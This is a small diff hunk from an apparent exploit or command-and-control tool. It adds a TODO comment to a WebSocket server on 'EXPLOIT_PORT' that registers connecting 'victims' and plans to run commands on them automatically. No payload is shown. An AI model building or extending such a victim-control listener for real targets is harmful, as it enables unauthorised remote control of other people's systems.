@@ -87,6 +87,7 @@ function main() {
     new ws.Server({ port: EXPLOIT_PORT })
     .on('connection', (conn, req) => {
         const vic_name = req.connection.remoteAddress + ':' + req.connection.remotePort
+        // TODO Include the victim's origin
         victims[vic_name] = conn
         console.log('New victim ' + vic_name)
         // TODO Implement the ability to automatically run commands on connect
